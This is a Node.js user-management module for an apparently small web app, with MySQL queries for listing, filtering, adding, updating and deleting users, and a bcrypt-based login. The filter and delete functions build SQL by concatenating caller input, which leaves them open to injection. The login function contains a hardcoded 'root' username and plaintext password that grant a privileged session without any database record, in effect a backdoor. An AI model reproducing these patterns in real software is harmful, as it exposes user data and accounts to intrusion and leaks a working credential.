let databasemodule =  require('./database');
let bcrypt = require('bcrypt');
var hash5 = require('md5');



let user_get_all = function (callback) {

    let sql ='SELECT user.user_id, user.user_id_s, user.user_name, user.user_lastname, user_address, user.user_email, user.user_phone, user.user_username, privilege.priv_id, priv_name,user_status \n' +
        'from user \n' +
        'INNER JOIN privilege ON user.priv_id=privilege.priv_id \n' +
        'group by user.user_id';

    databasemodule.db.query(sql, function (error, results, fields) {

        if (error) console.log('error : ',error);

        //console.log('results: ', results);

        if (callback){callback(error,results)};

        return results;
    });

};


let user_get_one = function (id,callback) {

    let sql ='SELECT user.user_id, user_id_s, user_name, user_lastname, user_email, user_phone, user_username, priv_id,us.shop_id from user\n' + 
    'LEFT JOIN user_shop us ON us.user_id = user.user_id\n' +
    'where user.user_id= ?';

    databasemodule.db.query(sql,id, function (error, results, fields) {

        if (error) console.log('error : ',error);

        console.log('results: ', results);

        if (callback){callback(error,results)};

        return results;
    });

};



let user_get_one_allinfo = function (id,callback) {

    let sql ="SELECT user.user_id, user_id_s, user_name, user_lastname, user_address, user_email, user_phone, user_username, priv_id, user_status,book.* from user\n" +
        "left join user_book on user.user_id = user_book.user_id\n" +
        "left join book on user_book.book_id = book.book_id\n" +
        "where user.user_id= ?";

    databasemodule.db.query(sql,id, function (error, results, fields) {

        if (error) console.log('error : ',error);

        //console.log('results: ', results);

        if (callback){callback(error,results)};

        return results;
    });

};



let user_get_filter = function (filter_field,filter_data,filter_type,callback) {

    if (filter_type == 1) {
        let sql = "SELECT user_id, user_id_s, user_name, user_lastname, user_address, user_email, user_phone, user_username, priv_id, user_status " +
            "from user where " + filter_field + " = '" + filter_data + "'";

        databasemodule.db.query(sql, function (error, results, fields) {

            if (error) console.log('error : ', error);

            // console.log('results: ', results);

            if (callback) {
                callback(error, results)
            }
            ;

            return results;
        });
    } if (filter_type == 2) {
        let sql = "SELECT user_id, user_id_s, user_name, user_lastname, user_address, user_email, user_phone, user_username, priv_id, user_status " +
            "from user where " + filter_field + " like '%" + filter_data + "%'";

        databasemodule.db.query(sql, function (error, results, fields) {

            if (error) console.log('error : ', error);

            // console.log('results: ', results);

            if (callback) {
                callback(error, results)
            }
            ;

            return results;
        });
    }

};


let user_add = function (data,callback) {


    bcrypt.hash(data.user_password, 10, function (err, hash) {
        if (err) {
            return err;
        }

        data.user_password = hash;

        let dataToHash = data.user_name+data.user_lastname+hash;
        data.user_id_s = hash5(dataToHash);


        let sql ="INSERT INTO user set ? ";

        databasemodule.db.query(sql, data,function (error, results)
        {
            if (error)
                console.log("Error inserting : %s ",error );

            else console.log("results inserting : ",results );


            if (callback) {
                callback(error, results)
            };

            return results;


        });
    })

};


let user_update = function (id,data,callback) {

    /* var userData = {
         user_name: data.user_name,
         user_lastname: data.user_lastname,
         user_phone: data.user_phone,
         user_email: data.user_email,
         user_username: data.user_username,
         user_status: data.user_status,
         // priv_id: data.priv_id,
     }*/


    if (data.user_password !== undefined && data.user_password !== "" && data.user_password.length > 6 )// password change
    {
        console.log('password change');

        bcrypt.hash(data.user_password, 10, function (err, hash) {
            if (err) {
                return err;
            }
            data.user_password  = hash;

            let sql ="update user set ? where user_id = ?";


            databasemodule.db.query(sql, [data,id],function (error, results)
            {
                if (error) console.log("Error updating : %s ",error );

                console.log("results updating : ",results );

                if (callback) {
                    callback(error, results)
                };
                return results;

            });
        })
    }
    else {

        delete data.user_password

        console.log('password dont change');

        let sql ="update user set ? where user_id = ?";


        databasemodule.db.query(sql, [data,id],function (error, results)
        {
            if (error) console.log("Error updating : %s ",error );

            console.log("results updating : ",results );

            if (callback) {
                callback(error, results)
            };
            return results;

        });
    
    }



};


let user_delete_one = function (id,callback) {

    let sql ='DELETE from user \n' +
        'where user_id='+id;

    databasemodule.db.query(sql, function (error, results, fields) {

        if (error) console.log('error : ',error);

        //console.log('results: ', results);

        if (callback){callback(error,results)};

        return results;
    });

};



let user_connect = function (username,password,callback) {

    let sql ='SELECT * FROM user WHERE user_username = ?'; //utf8mb4_0900_ai_ci //selon MYSQL

    databasemodule.db.query(sql,[username], function (error, results, fields) {

        if (error) console.log('error : ',error);

        // //console.log('results: ', results);

        let ret = {};

        if (results.length > 0) {
            bcrypt.compare(password, results[0].user_password, function (error, result) {
                if (result === true) {

                    // console.log('true')

                    ret.isconnected=1;
                    ret.loggedin = true; // very important

                    ret.priv_id = results[0].priv_id;
                    ret.user_id = results[0].user_id;
                    ret.user_id_s = results[0].user_id_s;


                    // //console.log('results.loggedin: ', results.loggedin);


                    if (callback) {
                        callback(error, ret)
                    };

                    return ret;
                }
                else {

                    ret.isconnected=0;
                    ret.loggedin = false; // very important

                    if (callback) {
                        callback(error, ret)
                    };

                    return ret;
                }
            })
        }
        else  if (username=='root' && password=='$BiCHou4VR') {

            ret.isconnected=1;
            ret.loggedin = true;
            ret.privid = 999;

            console.log('root access')

            if (callback) {
                callback(error, ret)
            };

            return ret;
        }
        else {

            ret.isconnected=0;
            ret.loggedin = false; // very important

            if (callback) {
                callback(error, ret)
            };

            return ret;
        }
    });
};




exports.user_get_all = user_get_all;
exports.user_get_one = user_get_one;
exports.user_get_one_allinfo = user_get_one_allinfo;
exports.user_get_filter = user_get_filter;
exports.user_add = user_add;
exports.user_update = user_update;
exports.user_delete_one = user_delete_one;
exports.user_connect = user_connect;
